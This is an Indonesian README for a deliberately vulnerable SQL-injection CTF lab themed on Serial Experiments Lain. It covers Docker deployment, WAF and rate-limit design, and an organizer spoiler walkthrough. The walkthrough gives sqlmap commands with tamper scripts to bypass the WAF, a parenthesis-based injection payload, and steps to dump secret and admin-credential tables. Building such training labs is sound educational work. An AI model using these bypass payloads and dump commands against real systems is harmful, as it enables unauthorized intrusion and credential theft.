# LAIN CTF — SQL Injection Lab (sqlmap practice, Medium)

Web CTF latihan SQL injection bertema **Serial Experiments Lain**, dibuat khusus untuk sqlmap. Level: **Medium** (blind SQLi + WAF + rate limit + decoy).

> Hanya untuk edukasi. Jangan pernah host ini terbuka ke publik tanpa izin.

---

## Deploy (Ubuntu server / di mana saja dengan Docker)

```bash
docker compose down -v
docker compose up -d --build
```

Akses: `http://<server-ip>:8001`

**Ganti flag/kredensial:** edit `FLAG_SQLI`, `FLAG_ADMIN`, `FLAG_DECOY`, `ADMIN_USERNAME`, `ADMIN_PASSWORD` di `docker-compose.yml`, lalu rebuild. Seeder (`src/includes/seed.php`) berjalan setiap container start dan menimpa isi tabel `secrets` + hash admin, jadi env bisa diubah kapan saja tanpa hapus volume.

## Arsitektur

| Service | Image | Keterangan |
|---|---|---|
| `web` | php:8.2-apache + dockerize | Aplikasi, publish `8001:80` |
| `db` | mysql:5.7 | Port TIDAK dipublish ke host (sqlmap harus lewat web) |

Database:
- `lain` → `episodes` (target query), `secrets` (**flag 1 & 2 di sini**), `admin_users` (**kredensial admin asli, bcrypt**), `knights_messages` (decoy)
- `admin` → `admins` (kredensial palsu/decoy)

## URL

| Halaman | URL |
|---|---|
| Landing/list episode | `/` (home.php) |
| Detail episode (rentan, blind) | `/detail.php?id=1` |
| Login admin (tersembunyi) | `/administrator/` |

Link admin sengaja tidak ada di halaman manapun — peserta harus menemukannya dengan dirsearch.

## Tingkat Kesulitan Medium — apa yang berubah

1. **Blind SQLi** — error MySQL tidak pernah ditampilkan. Pesan "Episode tidak ditemukan." generik untuk semua kegagalan. sqlmap harus pakai teknik boolean/time-based.
2. **WAF layer-7** — keyword diblokir (HTTP 403): `union`, `select`, `and`, `or`, `sleep`, `benchmark`, `extractvalue`, `updatexml`, `information_schema`, komentar `/* */`, **spasi**. Bypass: gunakan tanda kurung/parenthesis-based payload (mis. `?id=(1)and(1=1)`) atau `%09`/`%0a` whitespace alternatif, atau `sqlmap --tamper=space2paren,...`.
3. **Rate limit** — `detail.php` max 60 req/menit (HTTP 429), login admin max 5 percobaan/5 menit (HTTP 429). Pakai `--delay=1 --time-sec=15` di sqlmap.
4. **Flag TIDAK lagi di error page / header / view-source** — semua flag di dalam database.
5. **Decoy** — database `admin` berisi tabel `admins` dengan hash bcrypt palsu; tabel `knights_messages` berisi pesan pengecoh.
6. **Password admin bcrypt** — tidak bisa dicrack offline dengan rockyou; kredensial harus didapat dari dump tabel `admin_users` (format `username:password` dipakai sebagai input bcrypt).

## 2 Flag + 1 Decoy

| # | Flag | Lokasi | Cara dapat |
|---|---|---|---|
| 1 | `FLAG_SQLI` | `lain.secrets` bucket `flag_sqli` | Blind SQLi dump via sqlmap (boolean/time-based + tamper) |
| 2 | `FLAG_ADMIN` | `lain.secrets` bucket `flag_admin`, ditampilkan di dashboard admin | Dump `lain.admin_users` → dapat `username:password` → login → flag di dashboard |
| - | `FLAG_DECOY` | `lain.secrets` bucket `decoy` | Jebakan — bukan flag yang benar untuk submit |

## Walkthrough (ORGANIZER ONLY — spoiler)

```bash
# 0. Deteksi injeksi (error tidak tampil; pakai boolean-based)
sqlmap -u "http://<server>:8001/detail.php?id=1" --batch --technique=B --delay=1

# 1. WAF memblokir spasi/union/select -> butuh tamper script
sqlmap -u "http://<server>:8001/detail.php?id=1" --batch --technique=B \
  --tamper=space2paren,between --delay=1 --time-sec=15

# 2. Enumerasi database (jika tamper lolos; versi MySQL 5.7)
sqlmap ... --dbs
#    -> lain, admin, information_schema

# 3. Dump tabel secrets
sqlmap ... -D lain -T secrets --dump
#    -> flag_sqli = FLAG 1
#    -> decoy    = FLAG_DECOY (jebakan)
#    -> flag_admin butuh langkah login dulu

# 4. Dump kredensial admin asli
sqlmap ... -D lain -T admin_users --dump
#    -> username: lain_chrono | password_hash: bcrypt(username:password)
#    Hash bcrypt tidak practical dicrack offline (rockyou tidak akan
#    ketemu). Password plaintext TIDAK ada di DB — hanya ada di env
#    ADMIN_PASSWORD di docker-compose.yml (pegangan organizer).

#    Opsi untuk event publik (pilih salah satu):
#    a) Bagikan hint in-game: password = "nama episode psikologi
#       utama + tahun" dsb., lalu set ADMIN_PASSWORD sesuai hint.
#    b) Jika ingin peserta benar-benar crack: ganti bcrypt di
#       seeder menjadi hash dari password wordlist-friendly
#       (mis. "cyberia2026") dan biarkan peserta hashcat -m 3200.

# 5. Login di /administrator/ dengan kredensial -> FLAG 2 di dashboard

# Reset lengkap
docker compose down -v && docker compose up -d --build
```

> organizer dapat menyesuaikan kesulitan: hapus `--technique=B` restriction, atau tambah tamper lain (`space2dash`, `equaltolike`, dsb).
